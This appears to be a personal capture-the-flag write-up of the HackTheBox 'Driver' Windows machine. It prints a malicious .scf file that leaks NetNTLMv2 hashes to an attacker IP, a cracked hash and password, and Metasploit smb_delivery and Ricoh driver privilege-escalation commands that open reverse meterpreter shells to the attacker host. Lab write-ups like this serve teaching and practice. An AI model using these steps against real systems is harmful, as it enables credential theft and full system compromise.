---
created: 2025-09-06
---

📅 `2025-09-06`

#scf #responder #metasploit #vulnerable-driver

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Driver`   |
| --------------- | --- |
| 📆 Release Date |  `2021-10-02`   |
| 🌐 IP Address   |  `10.10.11.106`   |
| 🖥️ OS           |   `Windows`  |
| 🎯 Difficulty   |  `Easy`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `NetNTLMv2` hash stealing via `.scf` file on file share
- Vulnerable printer driver installed on target

**🛠️ Tools:**  

- `responder`
- `metasploit`

**📚 Learned:**  

- [[Interacting with Users#SCF on a File Share|NetNTLMv2 hash stealing with malicious .scf file on file share reviewed by user]].
- If a `metasploit` module hangs or errors out, we can try migrating to the `explorer.exe` process. Use `ps` and `migrate <PID>`. This happens when the session runs in a non-interactive process, and `explorer.exe` is always interactive.

----

## 🌐 Port Scan

- **TCP**: 80, 135, 445, 5985

---

## 🔍 Enumeration

The website had basic `HTTP` authentication enabled. I just tried `admin`:`admin` and it worked.

>[!tip]
>The username was also disclosed in the response headers.

Browsing the website, I found this:

![[Pasted image 20250905231514.png]]

I clicked the links and the only one that went somewhere else was the "Firmware Updates" button. It redirected me to this:

![[Pasted image 20250905231446.png]]

It's a file upload form. Enumerating the technologies I found that the website was running on `PHP` with an `IIS` server. I tried uploading several types of files to achieve `RCE`, but I got nothing.

I tried fuzzing for directories but there was only the `/images/` directory, which only had the image for the main site. Fuzzing for subdomains and checking the main site's image for embedded files also found nothing.

---

## 🪜 Foothold / User

I took a hint from `HackTheBox`'s guided mode, which pointed to stealing an `NTLM` hash. That made everything click.

These hints give it away:

![[Pasted image 20250905232007.png]]

The term "file share" should have tipped me off: I could upload an [[Interacting with Users#SCF on a File Share|SCF file]] that makes the user's machine connect to me, and catch their `NetNTLMv2` hash with `responder`.

I created this file, which I named `@test.scf`:

```shell
[Shell]
Command=2
IconFile=\\10.10.14.11\share\legit.ico
[TaskBar]
Command=ToggleDesktop
```

I started `responder` and uploaded the file:

![[Pasted image 20250905232528.png]]

Next, I cracked it.

```shell
hashcat hash.txt $ROCKYOU

TONY::DRIVER:7267440768eeb2df:e69e5755689858dde099a11c6da6f9cf:0101000000000000009383a0ba1edc0137d297117caf58ab000000000200080053004e003200330001001e00570049004e002d0057004f0034004b0059005a004e00330049004700590004003400570049004e002d0057004f0034004b0059005a004e0033004900470059002e0053004e00320033002e004c004f00430041004c000300140053004e00320033002e004c004f00430041004c000500140053004e00320033002e004c004f00430041004c0007000800009383a0ba1edc010600040002000000080030003000000000000000000000000020000013089a14126e33cadf2ab2f18fe8f7a4ae78cafd304d4cf7824e1314b1e5071e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000:liltony
```

Credentials:

- `tony`:`liltony`

Let's try them:

```shell
$ nxc smb 10.10.11.106 -u 'tony' -p 'liltony'

SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domin:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony
```

They worked. The machine also has the `WinRM` port open, so I tried that too.

![[Pasted image 20250905232745.png]]

That gave me a shell on the target machine.

![[Pasted image 20250905232850.png]]

Got user.

---

## 🛡️ Privilege Escalation

While enumerating, I checked the history file and found this:

```shell
*Evil-WinRM* PS C:\> type $env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

Given the machine's name, this stood out. I decided to check for exploits for this driver.

I found a local privilege escalation for this exact driver. It's a `metasploit` module:

![[Pasted image 20250906135806.png]]

I just had to open up `msfconsole` and get a `meterpreter` shell via `smb_delivery`.

```shell
use exploit/windows/smb/smb_delivery
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.11
run

[*] Run the following command on the target machine:
rundll32.exe \\0.0.0.0\sKQD\test.dll,0
```

On the remote machine:

```shell
*Evil-WinRM* PS C:\> rundll32.exe \\10.10.14.11\sKQD\test.dll,0
```

With the `meterpreter` shell, I ran the exploit.

```shell
use exploit/windows/local/ricoh_driver_privesc
set payload windows/x64/meterpreter/reverse_tcp
set session 1
set LHOST 10.10.14.11
run

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer NWTaDt...
```

It hung here. It turns out we have to migrate to the `explorer.exe` process for it to work, so that's what I did.

```shell
msf exploit(windows/local/ricoh_driver_privesc) > sessions -i 1
meterpreter > ps
<SNIP>
4792  652   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe

meterpreter > migrate 4792
[*] Migrating from 4652 to 4792...
[*] Migration completed successfully.

meterpreter > bg

msf exploit(windows/local/ricoh_driver_privesc) > run
[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer KjpML...
[*] Sending stage (203846 bytes) to 10.10.11.106
[+] Deleted C:\Users\tony\AppData\Local\Temp\kIePXliah.bat
[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
[*] Meterpreter session 2 opened (10.10.14.11:4444 -> 10.10.11.106:49501) at 2025-09-06 16:22:07 -0500
[*] Deleting printer KjpML
[*] 10.10.11.106 - Meterpreter session 1 closed.  Reason: Died
```

And we got a `SYSTEM` `meterpreter` session in session 2.

>[!note]
>We lost the first session because we used the same port in both sessions.

```shell
msf exploit(windows/local/ricoh_driver_privesc) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DRIVER  10.10.14.11:4444 -> 10.10.11.106:49501 (10.10.11.106)

msf exploit(windows/local/ricoh_driver_privesc) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Rooted.
